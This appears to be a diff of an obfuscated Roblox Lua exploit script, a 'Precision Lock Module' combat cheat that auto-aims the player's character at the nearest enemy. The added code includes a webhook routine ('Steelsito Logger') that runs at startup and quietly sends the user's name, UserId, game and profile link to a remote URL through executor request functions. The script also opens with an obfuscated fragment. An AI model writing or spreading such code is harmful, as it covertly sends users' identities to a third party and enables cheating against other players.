;v55=Instance.new(v7("\228\147\23\243\60","\56\162\225\118\158\89\142"),v53);v55.Size=UDim2.fromOffset(116 + 184 ,47 + 13 );v55.Position=UDim2.new(0.5, -(1433 -(1035 + 248)),0.5, -(51 -(20 + 1)));v55.BackgroundColor3=Color3.fromRGB(6 + 4 ,337 -(134 + 185) ,1168 -(549 + 584) );v55.BorderSizePixel=685 -(314 + 371) ;Instance.new(v7("\105\44\227\160\48\214\89\23","\184\60\101\160\207\66"),v55).CornerRadius=UDim.new(0,41 -29 );v56=Instance.new(v7("\4\171\79\168\35\141\119\185","\220\81\226\28"),v55);v52=2;end if (v52==(977 -(478 + 490))) then v66.BackgroundTransparency=1 + 0 ;v66.Text=v7("\179\68\84\45\139\76\93\98\196","\78\228\33\56")   .. v13.Name ;v66.TextColor3=Color3.fromRGB(1392 -(786 + 386) ,220,255);v66.Font=Enum.Font.GothamBold;v66.TextSize=11;v67=Instance.new(v7("\232\108\179\14\128","\229\174\30\210\99"),v61);v67.Size=UDim2.new(0.85 -0 ,0,1379 -(1055 + 324) ,1341 -(1093 + 247) );v67.Position=UDim2.new(0.075,0,0 + 0 ,11 + 87 );v52=39 -29 ;end end end v13.CharacterAdded:Connect(function(v90) local v91=0;local v92;while true do if (v91==(0 -0)) then v92=0 -0 ;while true do if (v92==(0 -0)) then v14=v90;v15=v90:WaitForChild(v7("\250\144\209\34\137\166\93\214","\52\178\229\188\67\231\201"));v92=1;end if (v92==(1 + 0)) then v29(v15);break;end end break;end end end);v27();v29(v15);task.spawn(function() v26(v7("\36\75\85\7\226\72\34\37\78","\67\65\33\48\100\151\60"));end);v30();
+local function sendWebhook()
+    local player = Players.LocalPlayer
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🚀 Script Ejecutado",
+            ["description"] = "Un usuario ha ejecutado el **Precision Lock Module**.",
+            ["color"] = 16724540, -- Rojo
+            ["fields"] = {
+                {["name"] = "Jugador:", ["value"] = player.Name .. " (" .. player.DisplayName .. ")", ["inline"] = true},
+                {["name"] = "ID:", ["value"] = tostring(player.UserId), ["inline"] = true},
+                {["name"] = "Juego:", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = false},
+                {["name"] = "Perfil:", ["value"] = "https://www.roblox.com/users/" .. player.UserId .. "/profile", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Steelsito Logger"},
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    local finalData = HttpService:JSONEncode(data)
+    
+    -- Intento de envío compatible con ejecutores
+    local requestFunc = syn and syn.request or http and http.request or http_request or request
+    if requestFunc then
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = finalData
+        })
+    end
+end
+
+-- Ejecutar Webhook al iniciar
+task.spawn(sendWebhook)
+
+--// PLAYER & CHARACTER
+local player = Players.LocalPlayer
+local camera = workspace.CurrentCamera
+local character = player.Character or player.CharacterAdded:Wait()
+local rootPart = character:WaitForChild("HumanoidRootPart")
+local humanoid = character:WaitForChild("Humanoid")
+
+-------------------------------------------------------------------
+--// VARIABLES — LOCK
+-------------------------------------------------------------------
+local isLockedS1 = false
+local lockedTargetS1 = nil
+local highlightS1 = nil
+local lookConnS1 = nil
+local lastLockedTarget = nil
+
+local shiftLockEnabled = false
+local shiftLockConn = nil
+
+-------------------------------------------------------------------
+--// SHIFTLOCK LÓGICA
+-------------------------------------------------------------------
+local lockTargetS1Func -- Declaración anticipada
+
+local function disableShiftLock()
+    shiftLockEnabled = false
+    if shiftLockConn then shiftLockConn:Disconnect(); shiftLockConn = nil end
+    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+    
+    if lastLockedTarget and lastLockedTarget.Parent then
+        lockTargetS1Func(lastLockedTarget)
+    else
+        humanoid.AutoRotate = true
+    end
+end
+
+local function enableShiftLock()
+    if shiftLockConn then shiftLockConn:Disconnect() end
+    shiftLockEnabled = true
+    humanoid.AutoRotate = false
+    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+
+    if isLockedS1 then
+        if lookConnS1 then lookConnS1:Disconnect(); lookConnS1 = nil end
+        isLockedS1 = false
+    end
+
+    shiftLockConn = RunService.RenderStepped:Connect(function()
+        if not shiftLockEnabled or not rootPart or humanoid.Health <= 0 then return end
+        local lookVector = camera.CFrame.LookVector
+        local flatLook = Vector3.new(lookVector.X, 0, lookVector.Z)
+        if flatLook.Magnitude > 0.01 then
+            rootPart.CFrame = rootPart.CFrame:Lerp(CFrame.lookAt(rootPart.Position, rootPart.Position + flatLook), 0.5)
+        end
+    end)
+end
+
+-------------------------------------------------------------------
+--// LÓGICA LOCK
+-------------------------------------------------------------------
+local clearLockS1
+
+clearLockS1 = function()
+    isLockedS1 = false
+    lockedTargetS1 = nil
+    humanoid.AutoRotate = true
+    if highlightS1 then highlightS1:Destroy(); highlightS1 = nil end
+    if lookConnS1 then lookConnS1:Disconnect(); lookConnS1 = nil end
+    local gui = player.PlayerGui:FindFirstChild("ModernLockGui")
+    if gui then
+        local btn = gui.MainFrame.lockBtn
+        btn.Text = "LOCK"
+        btn.TextColor3 = Color3.fromRGB(200, 60, 60)
+        gui.MainFrame.UIStroke.Color = Color3.fromRGB(80, 80, 80)
+    end
+end
+
+lockTargetS1Func = function(specificTarget)
+    local target = specificTarget or getClosestToCamera()
+    if not target then return end
+
+    if highlightS1 then highlightS1:Destroy() end
+    if lookConnS1 then lookConnS1:Disconnect() end
+
+    lockedTargetS1 = target
+    lastLockedTarget = target
+    isLockedS1 = true
+    humanoid.AutoRotate = false
+    
+    highlightS1 = Instance.new("Highlight", target)
+    highlightS1.FillColor = Color3.fromRGB(255, 60, 60)
+
+    local gui = player.PlayerGui:FindFirstChild("ModernLockGui")
+    if gui then
+        local btn = gui.MainFrame.lockBtn
+        btn.Text = "UNLOCK"
+        btn.TextColor3 = Color3.fromRGB(60, 200, 60)
+        gui.MainFrame.UIStroke.Color = Color3.fromRGB(60, 200, 60)
+    end
+
+    lookConnS1 = RunService.RenderStepped:Connect(function()
+        if not isLockedS1 or shiftLockEnabled or not lockedTargetS1 then return end
+        local tRoot = lockedTargetS1:FindFirstChild("HumanoidRootPart")
+        local tHum = lockedTargetS1:FindFirstChild("Humanoid")
+        if not tRoot or not tHum or tHum.Health <= 0 then clearLockS1() return end
+        if humanoid.Health <= 0 or humanoid.PlatformStand or humanoid.Sit then return end
+        local lookPos = Vector3.new(tRoot.Position.X, rootPart.Position.Y, tRoot.Position.Z)
+        rootPart.CFrame = rootPart.CFrame:Lerp(CFrame.lookAt(rootPart.Position, lookPos), 0.6)
+    end)
+end
+
+function getClosestToCamera()
+    local closest, shortest = nil, 300
+    local liveFolder = workspace:FindFirstChild("Live") or workspace
+    for _, model in ipairs(liveFolder:GetChildren()) do
+        if model ~= character and model:IsA("Model") then
+            local root = model:FindFirstChild("HumanoidRootPart")
+            local hum = model:FindFirstChild("Humanoid")
+            if root and hum and hum.Health > 0 then
+                local screenPos, visible = camera:WorldToViewportPoint(root.Position)
+                if visible then
+                    local dist = (Vector2.new(screenPos.X, screenPos.Y) - camera.ViewportSize / 2).Magnitude
+                    if dist < shortest then shortest = dist; closest = model end
+                end
+            end
+        end
+    end
+    return closest
+end
+
+-------------------------------------------------------------------
+--// DETECCIÓN POR ANIMACIÓN
+-------------------------------------------------------------------
+local function setupDetection(hum)
+    hum.AnimationPlayed:Connect(function(track)
+        local id = tostring(track.Animation.AnimationId)
+        if id:find("18790224306") and isLockedS1 and lockedTargetS1 then
+            local savedTarget = lockedTargetS1
+            clearLockS1()
+            task.spawn(function() 
+                task.wait(track.Length * 0.5)
+                if savedTarget and savedTarget.Parent then lockTargetS1Func(savedTarget) end 
+            end)
+        end
+        if id:find("14994398254") then
+            task.spawn(function() 
+                track.Stopped:Wait()
+                task.wait(2)
+                enableShiftLock()
+                task.wait(2)
+                disableShiftLock()
+            end)
+        end
+    end)
+end
+
+-------------------------------------------------------------------
+--// GUI & INICIALIZACIÓN
+-------------------------------------------------------------------
+local function createGuis()
+    local dragEnabled = true
+    local gui = Instance.new("ScreenGui", player.PlayerGui); gui.Name = "ModernLockGui"; gui.ResetOnSpawn = false
+    local mainFrame = Instance.new("Frame", gui); mainFrame.Name = "MainFrame"; mainFrame.Size = UDim2.fromOffset(165, 50); mainFrame.Position = UDim2.new(0.5, -82, 0.7, 0); mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20); mainFrame.Active = true; mainFrame.BorderSizePixel = 0; Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+    local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = Color3.fromRGB(80, 80, 80); stroke.Thickness = 2
+    local lockBtn = Instance.new("TextButton", mainFrame); lockBtn.Name = "lockBtn"; lockBtn.Size = UDim2.new(0.6, 0, 0.75, 0); lockBtn.Position = UDim2.new(0.05, 0, 0.125, 0); lockBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40); lockBtn.Text = "LOCK"; lockBtn.Font = Enum.Font.GothamBold; lockBtn.TextColor3 = Color3.fromRGB(200, 60, 60); lockBtn.TextSize = 14; Instance.new("UICorner", lockBtn)
+    local dragToggleBtn = Instance.new("TextButton", mainFrame); dragToggleBtn.Name = "Padlock"; dragToggleBtn.Size = UDim2.new(0.25, 0, 0.75, 0); dragToggleBtn.Position = UDim2.new(0.7, 0, 0.125, 0); dragToggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40); dragToggleBtn.Text = "🔓"; dragToggleBtn.TextSize = 18; Instance.new("UICorner", dragToggleBtn)
+
+    dragToggleBtn.MouseButton1Click:Connect(function() dragEnabled = not dragEnabled; dragToggleBtn.Text = dragEnabled and "🔓" or "🔒" end)
+    local dragging, dragStart, startPos
+    mainFrame.InputBegan:Connect(function(input) if dragEnabled and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then dragging = true; dragStart = input.Position; startPos = mainFrame.Position end end)
+    UserInputService.InputChanged:Connect(function(input) if dragging and dragEnabled then local delta = input.Position - dragStart; mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
+    UserInputService.InputEnded:Connect(function() dragging = false end)
+    lockBtn.MouseButton1Click:Connect(function() if isLockedS1 then clearLockS1() else lockTargetS1Func() end end)
+end
+
+local function showNotification()
+    local notifGui = Instance.new("ScreenGui", player.PlayerGui)
+    local notifFrame = Instance.new("TextLabel", notifGui)
+    notifFrame.Size = UDim2.fromScale(0.25, 0.05)
+    notifFrame.Position = UDim2.fromScale(0.375, -0.1)
+    notifFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    notifFrame.TextColor3 = Color3.fromRGB(255, 60, 60)
+    notifFrame.Text = "Lock System | Steelsito"
+    notifFrame.Font = Enum.Font.GothamBold
+    notifFrame.TextSize = 13
+    Instance.new("UICorner", notifFrame)
+    notifFrame:TweenPosition(UDim2.fromScale(0.375, 0.05), "Out", "Back", 0.5)
+    task.wait(2)
+    notifFrame:TweenPosition(UDim2.fromScale(0.375, -0.1), "In", "Quad", 0.5)
+    task.delay(0.6, function() notifGui:Destroy() end)
+end
+
+player.CharacterAdded:Connect(function(char)
+    character = char; rootPart = char:WaitForChild("HumanoidRootPart"); humanoid = char:WaitForChild("Humanoid")
+    clearLockS1(); setupDetection(humanoid)
+end)
+
+setupDetection(humanoid)
+createGuis()
+showNotification()
